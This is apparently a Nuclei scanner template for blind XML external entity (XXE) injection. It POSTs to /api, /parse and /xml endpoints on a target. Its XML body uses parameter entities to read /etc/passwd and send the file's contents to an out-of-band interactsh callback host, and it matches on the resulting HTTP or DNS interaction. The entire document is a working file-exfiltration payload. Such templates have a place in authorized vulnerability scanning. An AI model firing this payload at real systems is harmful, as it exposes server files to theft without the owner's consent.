id: m7-xxe-parameter-entity
info:
  name: M7 - XXE via Parameter Entity (Advanced)
  author: Sharlix
  severity: critical
  description: Advanced XXE using parameter entities for blind exfiltration
  tags: xxe,parameter-entity,advanced,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api"
      - "{{BaseURL}}/parse"
      - "{{BaseURL}}/xml"

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{{interactsh-url}}/?x=%file;'>">
        %eval; %exfil;
      ]>
      <root><data>test</data></root>

    headers:
      Content-Type: application/xml

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
